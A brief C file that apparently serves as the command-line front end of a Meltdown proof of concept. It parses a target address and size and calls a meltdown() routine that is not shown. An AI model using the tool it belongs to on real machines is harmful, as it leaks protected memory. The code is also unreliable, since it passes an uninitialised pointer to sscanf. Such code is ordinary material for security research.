#include "header.h"

void main(int argc, char* argv[]) {

	void* addr;	
	uint32_t* size;

	if(argc < 3) {
		printf("./meltdown [address] [size]\n");
		exit(1);
	}	
	
	if(!sscanf(argv[1], "%p", &addr)) {
		printf("Wrong address\n");
		exit(2);
	}
	
	if(!sscanf(argv[2], "%d", size)) {
		printf("Wrong size\n");
		exit(3);
	}
	
	meltdown(addr, size);
}
